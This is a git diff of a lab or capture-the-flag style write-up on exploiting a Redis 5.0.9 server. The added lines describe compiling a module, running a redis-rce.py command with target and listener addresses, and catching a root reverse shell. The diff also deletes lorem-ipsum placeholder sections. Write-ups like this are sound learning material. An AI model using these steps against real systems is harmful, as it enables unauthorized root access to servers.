@@ -318,8 +318,8 @@ Enumerated top 200 UDP ports:
 
 #### - Googled "redis key-value store 5.0.9 exploit github" and found the following link/web page showing the following redis rce exploit:
 
-![](Pasted%20image%2020221111102950.png)
-![](Pasted%20image%2020221111103142.png)
+![](Images/Pasted%20image%2020221111102950.png)
+![](Images/Pasted%20image%2020221111103142.png)
 
 ---
 
@@ -330,27 +330,19 @@ Enumerated top 200 UDP ports:
 
 #### -Downloaded the following exploit on my kali machine and compiled the "exp.so" and placed in the directory of the previous exploit I found:
 
-![](Pasted%20image%2020221111103254.png)
+![](Images/Pasted%20image%2020221111103254.png)
 
-![](Pasted%20image%2020221111103350.png)
+![](Images/Pasted%20image%2020221111103350.png)
 
+#### -Typed "python3 redis-rce.py -r 192.168.192.69 -L 192.168.49.192 -P 8080 -f exp.so" and chose the reverse shell option
+
+#### - Started a penelope listener on port 80 
+
+#### -Hit enter on the exploit and received a reverse shell as root:
+
+![](Images/Pasted%20image%2020221111103924.png)
+![](../Images/Pasted%20image%2020220531122846.png)
 ---
 
-# Lateral Movement to user
-## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
 
-## Lateral Movement vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
----
-
-# Privilege Escalation
-## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
-## Privilege Escalation vector
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
-
----
 
